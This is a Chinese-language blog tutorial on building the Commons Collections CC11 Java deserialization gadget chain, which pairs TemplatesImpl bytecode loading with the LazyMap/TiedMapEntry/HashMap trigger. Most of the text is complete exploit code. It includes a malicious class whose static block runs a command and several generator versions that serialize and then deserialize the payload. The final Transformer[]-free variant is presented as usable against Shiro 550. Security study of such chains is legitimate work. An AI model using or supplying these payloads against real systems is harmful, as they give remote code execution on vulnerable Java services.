---
title: java反序列化之CC11
date: 2026-08-22
---

# java反序列化之CC11

## 简述

CC11 其实可以看做是 CC2 + CC6 的结合体，除了 CC1-7 的链子，剩下的链子都可以通过结合产生 CC-N，下面方式其他几个 CC 链的流程图，顺便复习一下。

![1](https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/ALLCC.png)

## TemplatesImpl 解析与利用

之前学习动态类加载的文章中有分析过一种利用`ClassLoader#defineClass`直接加载字节码的手法，这个小链子的流程图如下：

![2](https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/ClassLoaderDefineClass.png)

首先是`loadClass()`，这个方法的作用是从已加载的类缓存、父加载器等位置寻找类（即双亲委派机制），在前面没找到的情况下执行`findClass()`。

对于`findClass()`方法：

- 根据名称或位置加载 .class 字节码,然后使用 defineClass
- 通常由子类去实现

`defineClass()`的作用是处理传入的字节码，将其转化为真正的 Java 类。但是`defineClass()`只加载类，不执行类。如果需要执行就需要进行`newInstance()`实例化。

但是我们的`defineClass()`方法的访问限制是`protected`，我们需要找到作用域是`public`的类。在`TemplatesImpl`类的`static class TransletClassLoader`中找到了合适的方法。

```java
static final class TransletClassLoader extends ClassLoader {
	private final Map<String,Class> _loadedExternalExtensionFunctions;

	TransletClassLoader(ClassLoader parent) {
		super(parent);
		_loadedExternalExtensionFunctions = null;
	}

	TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
		super(parent);
		_loadedExternalExtensionFunctions = mapEF;
	}
    
	public Class<?> loadClass(String name) throws ClassNotFoundException {
        Class<?> ret = null;
        // The _loadedExternalExtensionFunctions will be empty when the
        // SecurityManager is not set and the FSP is turned off
        if (_loadedExternalExtensionFunctions != null) {
            ret = _loadedExternalExtensionFunctions.get(name);
        }
        if (ret == null) {
            ret = super.loadClass(name);
        }
        return ret;
	}

        /**
         * Access to final protected superclass member from outer class.
         */
	Class defineClass(final byte[] b) {
	return defineClass(null, b, 0, b.length);
}
```

这里的`defineClass()`默认是`default`，在自己类中可以调用，继续查找用法。

![2](https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/defineTransletClasses.png)

但是这里是`private`，所以继续看谁调用了这个方法。还是这个类的`getTransletInstance()`方法，其中还有实例化的过程，如果能走完这个方法就能动态执行代码，但是这是私有的，继续找。

![3](https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/getTransletInstance.png)

然后就找到一个`public`方法：

![4](https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/synchronized.png)

### 利用逻辑

经过分析之后发现只要走到`getTransletInstance()`方法即可，因为这个方法内调用了`newInstance()`方法，用伪代码表示：

```java
TemplatesImpl templates = new TemplatesImpl();
templates.newTransformer();  // 因为是一层层调用的，我们需要后续赋值
```

如果没有限制条件，这两行代码就可以进行命令执行了，但是代码中我们需要满足一些特定条件：

![5](https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/ValueSee.png)

如果`_name`为`null`，后续的代码都不能执行，而且我们也要让`_class`为`null`，才能进行实例化。

### EXP

这里的`TemplatesImpl`是可以进行序列化的，这里使用反射修改值。

先列举一些我们需要进行赋值的属性值，用反射修改，需要什么类型的值，我们就给什么类型。

![6](https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/ValueSet.png)

`_class`的值应该是`null`，在`TemplatesImpl`中并没有给`_class`赋初值，所以不需要管。

`_name`一开始是`null`，我们需要给它简单赋值一个 String 就可以了。

`_bytecodes`的值需要是一个二维数组，所以我们就创建一个二维数组。但是`_bytecodes`传递到`defineClass()`的值是一个一维数组，而这个一维数组里面需要存放我们的恶意字节码。

先写一个`Calc`的恶意类并编译：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class Calc extends AbstractTranslet {
    public Calc() {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

类在初始化的时候会自动执行静态代码块。

`_tfactory`的值在`TemplatesImpl`这个类中定义是`null`，又被`transient`修饰，所以这个变量在被序列化后无法被访问。

```java
private transient TransformerFactoryImpl _tfactory = null;
```

但是这里我们只需要这个变量不为`null`就可以了。在`readObject()`方法中找到了`_tfactory`初始化定义。

![7](https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/tfactoryNotNull.png)

所以直接用反射赋值为`TransformerFactortImpl`即可。

完整的 EXP 如下：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TemplatesImplEXP {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"solo");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC11\\Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        templates.newTransformer();
    }
}
```

### 前半段 CC6 链解析

尾部是`InvokerTransformer.transform()`，所以从这里开始找。

```java
public Object transform(Object input) {
	if (input == null) {
		return null;
	}
	try {
		Class cls = input.getClass();
		Method method = cls.getMethod(iMethodName, iParamTypes);
		return method.invoke(input, iArgs);
                
	} catch (NoSuchMethodException ex) {
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
	} catch (IllegalAccessException ex) {
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
	} catch (InvocationTargetException ex) {
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
	}
}
```

这里存在反射调用任意方法。找到`LazyMap.get()`调用了`transform()`方法，参数是 factory，这个 factory 的变量我们到时候可以通过反射修改。

![8](https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/LazyMap.png)

然后去找谁调用了`get()`方法，根据以前的分析是`TiedMapEntry.getValue()`。

```java
public Object getValue() {
	return map.get(key);
}
```

然后在同一个类的`hashCode()`方法中调用了`getValue()`。

```java
public int hashCode() {
	Object value = getValue();
	return (getKey() == null ? 0 : getKey().hashCode()) ^
	(value == null ? 0 : value.hashCode()); 
}
```

后面就是 CC6 的链子，CC2 + CC6 的链子能够在`Transformer[]`被禁用的时候实现代码执行。

## 完善 EXP

我们用`InvokerTransformer.transform()`来执行`TemplatesImpl`的 EXP。

先写一下结合到`LazyMap`的 EXP：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class TemplatesImplEXP {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"solo");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC11\\Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        //templates.newTransformer();

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        lazyMap.get(chainedTransformer);
    }
}
```

下一步就是`TiedMapEntry`的`getValue()`：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class TemplatesImplEXP {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"solo");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC11\\Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        //templates.newTransformer();

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        //lazyMap.get(chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
        tiedMapEntry.getValue();
    }
}
```

继续向上找，同一个类下的`hashCode()`方法中调用了`getValue()`方法：

```java
public int hashCode() {
	Object value = getValue();
	return (getKey() == null ? 0 : getKey().hashCode()) ^
			(value == null ? 0 : value.hashCode()); 
}
```

找到了`hashCode()`方法，后面基本就是以`HashMap`作为入口类了。

下面结合`HashMap`写一个 EXP：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class TemplatesImplEXP {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"solo");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC11\\Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        //templates.newTransformer();

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        //lazyMap.get(chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
        //tiedMapEntry.getValue();
        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry,"value");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

但是这个 EXP 会在序列化之前就弹出计算机，这个情景其实和 URLDNS 链的场景很像。

在 CC6 的链子中，可以通过修改`Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);`来达到效果。

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class TemplatesImplEXP {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"solo");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC11\\Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        //templates.newTransformer();

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        //Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        //lazyMap.get(chainedTransformer);
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
        //tiedMapEntry.getValue();
        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry,"value");

        lazyMap.remove("key");

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factory = lazyMapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);

        serialize(expMap);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

## 不使用 Transform[] 的链子

真正的 CC11 的链子是不使用`Transform[]`，这样我们就可以利用这个链子来打 shiro550。

这个 `LazyMap#get` 的参数 key，会被传进`transform()`，实际上它可以扮演 ConstantTransformer 的角色——一个简单的对象传递者。

用`LazyMap.get(key)`直接调用`InvokerTransfomer.transform(key)`，然后像 CC2 那样调用`TempalteImpl.newTransformer()`来完成后续调用。

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class TemplatesImplEXP {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();

        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"solo");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC11\\Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        //templates.newTransformer();

        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "newTransformer",
                new Class[]{},
                new Object[]{}
        );

        //ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        //Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        //lazyMap.get(chainedTransformer);
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,templates);
        //tiedMapEntry.getValue();
        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry,"value");

        lazyMap.remove(templates);

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factory = lazyMapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,invokerTransformer);

        serialize(expMap);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

## 总结

CC11 是 yso 官方没有的链子，它是 CC2 和 CC6 的结合体，既能像 CC2 一样加载恶意字节码，同时受影响的版本比 CC6 要广。所以 CC11 是一个很好用的链子。



























